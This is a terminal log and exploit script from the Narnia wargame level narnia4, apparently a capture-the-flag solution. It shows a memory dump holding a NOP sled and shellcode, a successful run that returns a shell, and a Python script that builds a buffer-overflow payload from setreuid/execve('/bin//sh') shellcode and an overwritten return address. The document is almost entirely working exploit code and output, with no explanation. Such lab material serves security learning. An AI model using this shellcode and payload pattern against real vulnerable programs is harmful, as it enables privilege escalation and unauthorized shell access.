0xffffd6d6  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd6e6  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd6f6  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd706  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd716  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd726  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd736  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd746  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd756  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd766  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd776  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd786  9090 9090 9090 9090 9090 9090 9090 9090  ................
0xffffd796  9090 9090 6a31 58cd 8089 c389 d96a 4658  ....j1X......jFX
0xffffd7a6  cd80 9952 682f 2f73 6868 2f62 696e 89e3  ...Rh//shh/bin..
> [1]   Terminated              r2 /narnia/narnia4

[2]+  Stopped                 r2 /narnia/narnia4
narnia4@gibson:/tmp/tmp.QdE0pFsBmC$ vim script.py

narnia4@gibson:/tmp/tmp.QdE0pFsBmC$ /narnia/narnia4 $(./script.py)
$ ^C
$ exit
narnia4@gibson:/tmp/tmp.QdE0pFsBmC$ cat script.py
#!/usr/bin/python3
import sys, struct

address = 0xffffd6ff
shellcode =
b'\x6a\x31\x58\xcd\x80\x89\xc3\x89\xd9\x6a\x46\x58\xcd\x80\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80'

payload = b'\x90'*(264-len(shellcode)) + shellcode + struct.pack('<I',
address)

sys.stdout.buffer.write(payload)

